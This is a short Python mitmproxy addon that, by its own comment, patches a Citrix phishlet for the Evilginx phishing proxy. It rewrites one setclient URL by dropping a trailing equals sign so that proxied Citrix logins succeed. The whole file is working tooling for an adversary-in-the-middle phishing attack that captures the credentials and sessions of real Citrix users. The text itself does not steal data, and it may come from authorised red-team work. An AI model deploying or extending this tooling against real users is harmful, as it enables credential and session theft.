# MITM Proxy addon for the Citrix Phishlet, run this as a proxy to Evilginx to fix login issues (yes, that single equals sign breaks the entire login)
from mitmproxy import http

class URLModifierAddon:
    def __init__(self, target_url, modified_url):
        self.target_url = target_url
        self.modified_url = modified_url

    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.url == self.target_url:
            flow.request.url = self.modified_url

addons = [
    URLModifierAddon("https://{subdomain}.{domain}/cgi/setclient?wica=", "https://{subdomain}.{domain}/cgi/setclient?wica")
]
